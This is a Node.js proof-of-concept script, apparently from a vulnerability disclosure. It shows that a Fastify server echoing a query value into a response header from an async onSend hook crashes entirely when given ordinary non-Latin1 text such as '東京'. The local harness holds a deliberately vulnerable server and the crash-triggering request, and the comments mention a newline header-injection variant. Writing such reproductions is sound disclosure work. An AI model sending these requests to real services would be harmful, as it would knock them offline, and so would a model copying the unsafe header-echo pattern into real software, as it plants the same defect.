'use strict'
/*
 * I1 variant — "the invalid character need not be an attack".
 * ---------------------------------------------------------------------------
 * The base I1 PoC uses a newline (%0A) to make writeHead throw, which looks
 * like a header-injection attempt. This variant shows the SAME process crash is
 * triggered by perfectly ordinary international text — a value with a Unicode
 * code point > 0xFF (an emoji, a CJK name, a € sign, Cyrillic, ...). Node's
 * validateHeaderValue rejects code points > 0xFF with ERR_INVALID_CHAR exactly
 * as it rejects control characters.
 *
 * The app here does a completely ordinary thing: echo a request-provided label
 * into a response header (debug / trace id / cache key / personalization). There
 * is no "unsafe data" being mishandled — a label is just text. Yet a normal
 * value like "東京" (Tokyo) crashes the whole server.
 *
 * Why it matters: the crash is NOT gated on a malicious/CRLF payload, so
 * "sanitize untrusted input" does not describe or prevent it — the value is
 * valid text. It can be tripped by legitimate international users, not only
 * attackers. The real defect is that Fastify converts a routine ERR_INVALID_CHAR
 * (which it turns into a 500 on the sync path) into a process crash on the async
 * hook path.
 *
 *   Run:  node poc-variant-benign-unicode.js
 */
const path = require('path')
const { fork } = require('child_process')
const http = require('http')

const FASTIFY = path.join(__dirname, '..', '..', 'fastify.js')

// --------------------------------------------------------------------------
// CHILD ROLE: the vulnerable server
// --------------------------------------------------------------------------
if (process.env.POC_ROLE === 'server') {
  const Fastify = require(FASTIFY)
  const app = Fastify({ logger: false })

  // Ordinary pattern: echo a request-provided label into a response header.
  // Query values are UTF-8 decoded into real Unicode strings, so "東京" arrives
  // as code points > 0xFF (unlike raw header bytes, which stay Latin1).
  app.addHook('onSend', async (req, reply, payload) => {
    reply.header('x-echo-label', req.query.label || '')
    return payload
  })
  app.get('/', async () => ({ ok: true }))

  app.listen({ port: 0, host: '127.0.0.1' })
    .then(() => process.send({ port: app.server.address().port }))
    .catch((e) => { console.error('server failed to start', e); process.exit(2) })
  return
}

// --------------------------------------------------------------------------
// PARENT ROLE: harness
// --------------------------------------------------------------------------
console.log('=== I1 variant: benign international text crashes the process (no injection) ===\n')

const child = fork(__filename, [], {
  env: { ...process.env, POC_ROLE: 'server' },
  stdio: ['ignore', 'inherit', 'inherit', 'ipc']
})

let exited = false

function get (port, pathStr) {
  return new Promise((resolve) => {
    const r = http.get({ host: '127.0.0.1', port, path: pathStr }, (res) => {
      res.resume(); res.on('end', () => resolve({ status: res.statusCode }))
    })
    r.on('error', (e) => resolve({ status: 'ERR', code: e.code }))
  })
}

child.on('message', async ({ port }) => {
  console.log(`[harness] server up on 127.0.0.1:${port}\n`)

  // 1) benign ASCII label -> works fine
  const r1 = await get(port, '/?label=hello')
  console.log(`[harness] GET /?label=hello                  -> ${r1.status}   (plain ASCII, fine)`)

  // 2) benign Japanese label "東京" (Tokyo), URL-encoded UTF-8 -> crash
  console.log('[harness] GET /?label=%E6%9D%B1%E4%BA%AC   (label = "東京" — ordinary text, NOT an attack)')
  const r2 = await get(port, '/?label=%E6%9D%B1%E4%BA%AC')
  console.log(`[harness]   -> ${r2.status}${r2.code ? ' ' + r2.code : ''}   (server died mid-response)`)
})

child.on('exit', (code) => {
  exited = true
  console.log(`\n[harness] SERVER PROCESS EXITED  code=${code}`)
  if (code !== 0) {
    console.log('\n==> A benign non-Latin1 value (a CJK name / emoji / € / Cyrillic) — no CRLF, no injection —')
    console.log('    crashed the whole process. Nothing here is "unsafe data" to sanitize; it is valid text.')
    console.log('    Same defect as base I1: a recoverable ERR_INVALID_CHAR (a 500 on the sync path)')
    console.log('    becomes an unhandledRejection -> process abort on the async onSend hook path.')
    process.exit(0)
  } else {
    console.log('\n==> Not reproduced (server survived).')
    process.exit(1)
  }
})

setTimeout(() => {
  if (!exited) { console.log('[harness] server survived 5s — not reproduced'); child.kill('SIGKILL'); process.exit(1) }
}, 5000)
